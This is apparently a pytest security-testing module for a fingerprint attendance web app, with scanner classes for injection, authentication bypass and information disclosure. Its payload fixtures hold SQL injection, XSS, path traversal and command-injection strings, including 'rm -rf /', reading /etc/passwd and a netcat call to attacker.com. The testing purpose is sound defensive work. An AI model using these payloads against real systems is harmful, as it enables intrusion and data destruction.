"""
Security Testing Configuration for Fingerprint Time Logger
Comprehensive security testing infrastructure with automated vulnerability scanning
"""
import os
import pytest
import asyncio
import secrets
import hashlib
import subprocess
import json
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from httpx import AsyncClient
from sqlalchemy import text as inspect_text
from unittest.mock import patch, MagicMock

from tests.conftest import test_client, test_db, test_employee, test_device

class SecurityLevel(Enum):
    """Security vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class SecurityVulnerability:
    """Security vulnerability finding"""
    id: str
    title: str
    description: str
    severity: SecurityLevel
    category: str
    endpoint: Optional[str]
    payload: Optional[str]
    recommendation: str
    cwe: Optional[str] = None

@dataclass
class SecurityReport:
    """Complete security assessment report"""
    vulnerabilities: List[SecurityVulnerability]
    total_tests: int
    passed_tests: int
    failed_tests: int
    critical_count: int
    high_count: int
    medium_count: int
    low_count: int

# Security Test Fixtures

@pytest.fixture
def security_client(test_client):
    """HTTP client configured for security testing"""
    return test_client

@pytest.fixture
def malicious_payloads():
    """Common malicious payloads for security testing"""
    return {
        'sql_injection': [
            "' OR '1'='1",
            "'; DROP TABLE employees; --",
            "1' UNION SELECT * FROM employees--",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1; DELETE FROM attendance_records; --"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=javascript:alert(1)></iframe>",
            "<body onload=alert('XSS')>"
        ],
        'command_injection': [
            "; ls -la",
            "| cat /etc/passwd",
            "&& id",
            "$(whoami)",
            "`id`",
            "; rm -rf /",
            "| nc attacker.com 4444"
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ],
        'ldap_injection': [
            "*)(uid=*",
            "*)(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*"
        ],
        'nosql_injection': [
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'sleep(5000)'}"
        ]
    }

@pytest.fixture
def fuzzing_data():
    """Data for fuzzing endpoints"""
    return {
        'large_strings': [
            'A' * 10000,
            'A' * 100000,
            'A' * 1000000
        ],
        'unicode_attacks': [
            '\u0000',  # Null byte
            '\u202e',  # Right-to-left override
            '\ufeff',  # Byte order mark
            '\u2028',  # Line separator
            '\u2029'   # Paragraph separator
        ],
        'format_strings': [
            '%s%s%s%s',
            '%x%x%x%x',
            '%n%n%n%n',
            '{0}{1}{2}{3}'
        ],
        'overflow_attempts': [
            -2147483648,  # INT_MIN
            2147483647,   # INT_MAX
            -1,
            0,
            999999999999999999999999999999
        ]
    }

@pytest.fixture
def authentication_test_data():
    """Authentication and authorization test data"""
    return {
        'weak_passwords': [
            '123456',
            'password',
            'admin',
            'qwerty',
            '12345678',
            'abc123'
        ],
        'session_tokens': [
            'invalid_token',
            '',
            'expired_token_12345',
            '../admin_token',
            '<script>alert(1)</script>'
        ],
        'user_roles': [
            'admin',
            'user',
            'guest',
            'super_admin',
            '../admin',
            'ADMIN'
        ]
    }

# Security Testing Utilities

class SecurityTester:
    """Base class for security testing"""

    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []

    def add_vulnerability(self, vuln: SecurityVulnerability):
        """Add vulnerability to report"""
        self.vulnerabilities.append(vuln)

    async def test_endpoint_security(self, endpoint: str, method: str = "GET",
                                   data: Dict = None) -> List[SecurityVulnerability]:
        """Test endpoint for common vulnerabilities"""
        vulnerabilities = []

        # Test SQL injection
        if data:
            for field, value in data.items():
                for payload in malicious_payloads()['sql_injection']:
                    test_data = data.copy()
                    test_data[field] = payload

                    try:
                        if method.upper() == "POST":
                            response = await self.client.post(endpoint, json=test_data)
                        elif method.upper() == "PUT":
                            response = await self.client.put(endpoint, json=test_data)
                        else:
                            response = await self.client.get(endpoint, params=test_data)

                        # Check for SQL error indicators
                        response_text = response.text.lower()
                        sql_error_indicators = [
                            'sql syntax',
                            'mysql_fetch',
                            'ora-',
                            'postgresql',
                            'sqlite_',
                            'sqlstate'
                        ]

                        for indicator in sql_error_indicators:
                            if indicator in response_text:
                                vulnerabilities.append(SecurityVulnerability(
                                    id=f"sql_inj_{field}_{len(vulnerabilities)}",
                                    title=f"SQL Injection in {field}",
                                    description=f"Potential SQL injection vulnerability in field '{field}'",
                                    severity=SecurityLevel.HIGH,
                                    category="Injection",
                                    endpoint=endpoint,
                                    payload=payload,
                                    recommendation="Use parameterized queries and input validation",
                                    cwe="CWE-89"
                                ))
                                break

                    except Exception as e:
                        # Unexpected errors might indicate vulnerabilities
                        if "sql" in str(e).lower():
                            vulnerabilities.append(SecurityVulnerability(
                                id=f"sql_error_{field}_{len(vulnerabilities)}",
                                title=f"SQL Error in {field}",
                                description=f"SQL error triggered by malicious input: {str(e)}",
                                severity=SecurityLevel.MEDIUM,
                                category="Injection",
                                endpoint=endpoint,
                                payload=payload,
                                recommendation="Implement proper error handling"
                            ))

        return vulnerabilities

class InputValidationTester(SecurityTester):
    """Input validation security testing"""

    async def test_input_validation(self, endpoint: str, field_name: str,
                                  test_values: List[Any]) -> List[SecurityVulnerability]:
        """Test input validation for specific field"""
        vulnerabilities = []

        for test_value in test_values:
            try:
                response = await self.client.post(endpoint, json={field_name: test_value})

                # Check if malicious input was accepted
                if response.status_code == 200 or response.status_code == 201:
                    # Check if the value was stored/processed
                    if isinstance(test_value, str) and any(char in test_value for char in ['<', '>', '&', '"', "'"]):
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"input_val_{field_name}_{len(vulnerabilities)}",
                            title=f"Insufficient Input Validation - {field_name}",
                            description=f"Field '{field_name}' accepts potentially dangerous input",
                            severity=SecurityLevel.MEDIUM,
                            category="Input Validation",
                            endpoint=endpoint,
                            payload=str(test_value),
                            recommendation="Implement strict input validation and sanitization",
                            cwe="CWE-20"
                        ))

            except Exception:
                # Proper error handling is expected
                pass

        return vulnerabilities

class AuthenticationTester(SecurityTester):
    """Authentication and authorization security testing"""

    async def test_authentication_bypass(self, protected_endpoints: List[str]) -> List[SecurityVulnerability]:
        """Test authentication bypass attempts"""
        vulnerabilities = []

        bypass_attempts = [
            {},  # No auth headers
            {'Authorization': ''},  # Empty auth
            {'Authorization': 'Bearer invalid'},  # Invalid token
            {'Authorization': 'Basic invalid'},  # Invalid basic auth
            {'X-User-Id': '1'},  # Header injection
            {'X-Admin': 'true'},  # Privilege escalation attempt
        ]

        for endpoint in protected_endpoints:
            for attempt in bypass_attempts:
                try:
                    headers = attempt.copy()
                    response = await self.client.get(endpoint, headers=headers)

                    # If we get 200 OK without proper auth, it's a vulnerability
                    if response.status_code == 200:
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"auth_bypass_{endpoint}_{len(vulnerabilities)}",
                            title=f"Authentication Bypass - {endpoint}",
                            description=f"Endpoint accessible without proper authentication",
                            severity=SecurityLevel.HIGH,
                            category="Authentication",
                            endpoint=endpoint,
                            payload=str(attempt),
                            recommendation="Implement proper authentication checks",
                            cwe="CWE-287"
                        ))

                except Exception:
                    pass

        return vulnerabilities

class DataExposureTester(SecurityTester):
    """Data exposure and information disclosure testing"""

    async def test_information_disclosure(self, endpoints: List[str]) -> List[SecurityVulnerability]:
        """Test for information disclosure vulnerabilities"""
        vulnerabilities = []

        sensitive_patterns = [
            r'password\s*[:=]\s*["\']?([^"\'\\s]+)',
            r'secret\s*[:=]\s*["\']?([^"\'\\s]+)',
            r'key\s*[:=]\s*["\']?([^"\'\\s]+)',
            r'token\s*[:=]\s*["\']?([^"\'\\s]+)',
            r'/home/[\w-]+',
            r'C:\\\\Users\\\\[\w-]+',
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',  # IP addresses
            r'[a-zA-Z0-9+/]{20,}={0,2}',  # Base64 patterns
        ]

        for endpoint in endpoints:
            try:
                response = await self.client.get(endpoint)
                response_text = response.text

                import re
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"info_disc_{endpoint}_{len(vulnerabilities)}",
                            title=f"Information Disclosure - {endpoint}",
                            description=f"Endpoint exposes sensitive information",
                            severity=SecurityLevel.MEDIUM,
                            category="Information Disclosure",
                            endpoint=endpoint,
                            payload=None,
                            recommendation="Remove sensitive information from responses",
                            cwe="CWE-200"
                        ))

                # Check for error messages that reveal too much
                error_indicators = [
                    'traceback',
                    'stack trace',
                    'internal server error',
                    'debug',
                    'exception'
                ]

                for indicator in error_indicators:
                    if indicator.lower() in response_text.lower():
                        vulnerabilities.append(SecurityVulnerability(
                            id=f"error_disc_{endpoint}_{len(vulnerabilities)}",
                            title=f"Verbose Error Messages - {endpoint}",
                            description=f"Endpoint returns detailed error information",
                            severity=SecurityLevel.LOW,
                            category="Information Disclosure",
                            endpoint=endpoint,
                            payload=None,
                            recommendation="Implement generic error messages",
                            cwe="CWE-209"
                        ))

            except Exception:
                pass

        return vulnerabilities

class SecurityScanner:
    """Complete security scanner"""

    def __init__(self, client):
        self.client = client
        self.testers = [
            InputValidationTester(client),
            AuthenticationTester(client),
            DataExposureTester(client)
        ]

    async def run_comprehensive_scan(self) -> SecurityReport:
        """Run comprehensive security scan"""
        all_vulnerabilities = []

        # Define test endpoints
        endpoints_to_test = [
            "/api/employees/",
            "/api/devices/",
            "/api/attendance/",
            "/api/employees/export/csv",
            "/api/system/health",
        ]

        # Run all security tests
        for tester in self.testers:
            if isinstance(tester, InputValidationTester):
                # Test input validation
                test_data = [
                    "<script>alert('XSS')</script>",
                    "'; DROP TABLE employees; --",
                    "../../../etc/passwd",
                    "\x00\x01\x02\x03",
                    "A" * 10000
                ]

                for endpoint in endpoints_to_test:
                    if endpoint in ["/api/employees/", "/api/devices/"]:
                        vulns = await tester.test_input_validation(endpoint, "name", test_data)
                        all_vulnerabilities.extend(vulns)

            elif isinstance(tester, AuthenticationTester):
                # Test authentication (when auth is implemented)
                protected_endpoints = ["/api/system/logs", "/api/admin/"]
                vulns = await tester.test_authentication_bypass(protected_endpoints)
                all_vulnerabilities.extend(vulns)

            elif isinstance(tester, DataExposureTester):
                # Test information disclosure
                vulns = await tester.test_information_disclosure(endpoints_to_test)
                all_vulnerabilities.extend(vulns)

        # Count vulnerabilities by severity
        critical_count = sum(1 for v in all_vulnerabilities if v.severity == SecurityLevel.CRITICAL)
        high_count = sum(1 for v in all_vulnerabilities if v.severity == SecurityLevel.HIGH)
        medium_count = sum(1 for v in all_vulnerabilities if v.severity == SecurityLevel.MEDIUM)
        low_count = sum(1 for v in all_vulnerabilities if v.severity == SecurityLevel.LOW)

        total_tests = len(endpoints_to_test) * len(self.testers) * 5  # Approximate
        failed_tests = len(all_vulnerabilities)
        passed_tests = total_tests - failed_tests

        return SecurityReport(
            vulnerabilities=all_vulnerabilities,
            total_tests=total_tests,
            passed_tests=passed_tests,
            failed_tests=failed_tests,
            critical_count=critical_count,
            high_count=high_count,
            medium_count=medium_count,
            low_count=low_count
        )

# Automated Security Tools Integration

@pytest.fixture
async def bandit_scan():
    """Run Bandit security scanner"""
    try:
        subprocess.run(["pip", "install", "bandit"], capture_output=True)

        result = subprocess.run([
            "bandit", "-r", "app/",
            "-f", "json",
            "-o", "bandit_report.json"
        ], capture_output=True, text=True)

        if os.path.exists("bandit_report.json"):
            with open("bandit_report.json", 'r') as f:
                return json.load(f)

    except Exception as e:
        print(f"Bandit scan failed: {e}")

    return {"results": []}

@pytest.fixture
async def safety_check():
    """Check for known security vulnerabilities in dependencies"""
    try:
        subprocess.run(["pip", "install", "safety"], capture_output=True)

        result = subprocess.run([
            "safety", "check", "--json"
        ], capture_output=True, text=True)

        if result.stdout:
            return json.loads(result.stdout)

    except Exception as e:
        print(f"Safety check failed: {e}")

    return []

# Security Test Markers

@pytest.fixture(autouse=True)
def security_test_setup():
    """Setup for security tests"""
    # Ensure security report directory exists
    reports_dir = Path("security_reports")
    reports_dir.mkdir(exist_ok=True)

    yield

    # Cleanup security artifacts
    artifacts = [
        "bandit_report.json",
        "safety_report.json"
    ]

    for artifact in artifacts:
        if os.path.exists(artifact):
            try:
                os.remove(artifact)
            except:
                pass

# Mock vulnerable scenarios for testing

@pytest.fixture
def vulnerable_endpoint_mock():
    """Mock vulnerable endpoint for testing security tools"""

    def mock_vulnerable_response(payload: str):
        """Simulate vulnerable response"""
        if "DROP TABLE" in payload:
            return MockResponse("SQL Error: syntax error near 'DROP'", 500)
        elif "<script>" in payload:
            return MockResponse(f"Hello {payload}", 200)
        else:
            return MockResponse("OK", 200)

    return mock_vulnerable_response

class MockResponse:
    """Mock HTTP response for testing"""

    def __init__(self, text: str, status_code: int):
        self.text = text
        self.status_code = status_code
        self.headers = {}

# Security Test Utilities

def generate_security_report(scanner_result: SecurityReport, output_path: Path):
    """Generate comprehensive security report"""

    report_html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Assessment Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .critical {{ color: #dc3545; font-weight: bold; }}
            .high {{ color: #fd7e14; font-weight: bold; }}
            .medium {{ color: #ffc107; }}
            .low {{ color: #28a745; }}
            .vulnerability {{
                border: 1px solid #ddd;
                padding: 15px;
                margin: 10px 0;
                border-radius: 5px;
            }}
        </style>
    </head>
    <body>
        <h1>Security Assessment Report</h1>

        <h2>Summary</h2>
        <p><strong>Total Vulnerabilities:</strong> {len(scanner_result.vulnerabilities)}</p>
        <p><strong>Critical:</strong> <span class="critical">{scanner_result.critical_count}</span></p>
        <p><strong>High:</strong> <span class="high">{scanner_result.high_count}</span></p>
        <p><strong>Medium:</strong> <span class="medium">{scanner_result.medium_count}</span></p>
        <p><strong>Low:</strong> <span class="low">{scanner_result.low_count}</span></p>

        <h2>Vulnerabilities</h2>
    """

    for vuln in scanner_result.vulnerabilities:
        severity_class = vuln.severity.value
        report_html += f"""
        <div class="vulnerability">
            <h3 class="{severity_class}">{vuln.title}</h3>
            <p><strong>Severity:</strong> <span class="{severity_class}">{vuln.severity.value.upper()}</span></p>
            <p><strong>Category:</strong> {vuln.category}</p>
            {f'<p><strong>Endpoint:</strong> {vuln.endpoint}</p>' if vuln.endpoint else ''}
            <p><strong>Description:</strong> {vuln.description}</p>
            <p><strong>Recommendation:</strong> {vuln.recommendation}</p>
            {f'<p><strong>CWE:</strong> {vuln.cwe}</p>' if vuln.cwe else ''}
        </div>
        """

    report_html += """
    </body>
    </html>
    """

    with open(output_path, 'w') as f:
        f.write(report_html)

# Export security testing functions
__all__ = [
    'SecurityTester',
    'InputValidationTester',
    'AuthenticationTester',
    'DataExposureTester',
    'SecurityScanner',
    'SecurityReport',
    'SecurityVulnerability',
    'SecurityLevel',
    'generate_security_report'
]